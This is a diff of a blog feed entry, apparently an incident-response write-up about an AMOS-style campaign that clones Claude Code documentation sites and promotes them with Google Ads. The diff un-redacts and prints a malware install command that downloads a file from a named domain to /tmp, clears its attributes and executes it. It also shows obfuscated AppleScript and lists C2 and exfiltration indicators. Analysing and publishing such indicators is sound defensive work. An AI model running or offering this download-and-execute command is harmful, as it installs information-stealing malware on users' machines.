@@ -20,12 +20,13 @@
       <guid>http://localhost:1313/blog/claude-code-malware/</guid>
       <description>&lt;p&gt;A few weeks ago, we had a rather scary EDR notification pop up in our monitoring Slack channel. It said (paraphrased):&lt;/p&gt;
 &lt;blockquote&gt;
-&lt;p&gt;A suspicious Unix shell command was run, we killed the process but check this shit out&lt;/p&gt;
+&lt;p&gt;A suspicious Unix shell command was run, we killed the process but y&amp;rsquo;all might have a problem anyway&lt;/p&gt;
 &lt;/blockquote&gt;
-&lt;p&gt;The actual command pasted was as follows (domain redacted):&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;/bin/bash -c &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;#!/bin/bash curl -o /tmp/update https://&amp;lt;REDACTED&amp;gt;.com/n8n/update \&lt;/span&gt;
+&lt;p&gt;The actual command pasted was as follows:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1&lt;/span&gt;&lt;span&gt;/bin/bash -c &lt;span style=&#34;color:#60a0b0;font-style:italic&#34;&gt;#!/bin/bash curl -o /tmp/update https://raytherrien.com/n8n/update \&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2&lt;/span&gt;&lt;span&gt; &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; xattr -c /tmp/update &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; chmod +x /tmp/update &lt;span style=&#34;color:#666&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; /tmp/update
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Suspicious, indeed. Shoutout to Crowdstrike EDR for stopping this thing in its tracks. More recently, a founder friend of mine reached out
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Suspicious, indeed. Shoutout to Crowdstrike EDR for stopping this thing in its tracks &amp;ndash; we were, in fact, fine.
+Then last week, a founder friend of mine reached out
 and asked if I could hop on a call as one of their engineers seemed to have run some malware on their machine and could I jump in to
 give them a hand with incident response?&lt;/p&gt;
 &lt;p&gt;As soon as I started looking at the logs, it became pretty clear that this was the same as what I saw a few weeks prior, but my
@@ -40,8 +41,9 @@ but only &lt;em&gt;after&lt;/em&gt; allowing the execution to proceed.&lt;/p&gt;
 &lt;/h1&gt;&lt;p&gt;Much has already been written about similar ongoing campaigns, but the high level way they work is this:&lt;/p&gt;
 &lt;ol&gt;
 &lt;li&gt;The threat actor compromises one or several Google Ads accounts (the exact mechanism will vary).&lt;/li&gt;
-&lt;li&gt;They also compromise insecure personal websites, domains, or register throwaway subdomains on free hosting sites.&lt;/li&gt;
-&lt;li&gt;Armed with these two tools, they clone documentation sites for tools such as Claude Code and place ads on Google
+&lt;li&gt;They also compromise insecure domains, or register throwaway subdomains on free hosting sites. Anecdotally, a lot of the
+sites used appear to be individuals&amp;rsquo; personal blogs/websites.&lt;/li&gt;
+&lt;li&gt;Next, they clone documentation sites for tools such as Claude Code and place ads on Google
 to get their faked sites to the top of search results.&lt;/li&gt;
 &lt;li&gt;The fake sites have install instructions that give you malware to run.&lt;/li&gt;
 &lt;li&gt;You, the user, helpfully run the malware for the attacker.&lt;/li&gt;
@@ -148,7 +150,7 @@ solely to make behavioural analysis harder; they&amp;rsquo;re calculated and upd
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;repeat&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9&lt;/span&gt;&lt;span&gt;	&lt;span style=&#34;color:#60add5&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;dpruioywaxp&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;end&lt;/span&gt; &lt;span style=&#34;color:#bb60d5&#34;&gt;cmbnxmjiwwr&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This function builds a string by &lt;em&gt;adding&lt;/em&gt; the contents of two arrays. If we were to transpose this to Python, it looks something like this:&lt;/p&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This function builds a string by &lt;em&gt;adding&lt;/em&gt; the contents of two arrays. If we transpose this to Python and rename the variables, it looks something like this:&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1&lt;/span&gt;&lt;span&gt;&lt;span style=&#34;color:#007020;font-weight:bold&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#06287e&#34;&gt;string_by_adding&lt;/span&gt;(a: &lt;span style=&#34;color:#007020&#34;&gt;list&lt;/span&gt;[&lt;span style=&#34;color:#007020&#34;&gt;int&lt;/span&gt;], b: &lt;span style=&#34;color:#007020&#34;&gt;list&lt;/span&gt;[&lt;span style=&#34;color:#007020&#34;&gt;int&lt;/span&gt;]) &lt;span style=&#34;color:#666&#34;&gt;-&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#007020&#34;&gt;str&lt;/span&gt;:
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2&lt;/span&gt;&lt;span&gt;    out &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#4070a0&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span style=&#34;white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3&lt;/span&gt;&lt;span&gt;    dummy_var &lt;span style=&#34;color:#666&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#40a070&#34;&gt;1&lt;/span&gt;
@@ -198,7 +200,8 @@ when new login items are added.&lt;/p&gt;
 &lt;/span&gt;
 &lt;/h1&gt;&lt;p&gt;This is almost certainly an AMOS affiliate campaign - I&amp;rsquo;m not certain that both instances I&amp;rsquo;ve seen were actually the same campaign since we halted
 execution in one case, but the successful execution made references to a campaign ID of &lt;code&gt;wusetail.com&lt;/code&gt;, and had &lt;code&gt;avipstudios.com&lt;/code&gt; as a fallback
-C2 domain. Data exfiltration happened to &lt;code&gt;38.244.158.103&lt;/code&gt; which is located in the Netherlands.&lt;/p&gt;
+C2 domain. Data exfiltration happened to &lt;code&gt;38.244.158.103&lt;/code&gt; which is located in the Netherlands. In both cases, the initial payload &lt;em&gt;domain&lt;/em&gt; differed,
+but the path was &lt;code&gt;/n8n/update&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Darktrace&amp;rsquo;s research also noted an IP located in the Netherlands but on a different ASN. What was the same was the exfiltration path of &lt;code&gt;/api/tasks/&amp;lt;base64 string&amp;gt;&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;Since this is a fairly &amp;ldquo;standard&amp;rdquo; malware, most EDR vendors should have good IOCs in general here.&lt;/p&gt;
 &lt;h1 id=&#34;lessons-learned&#34; &gt;Lessons Learned
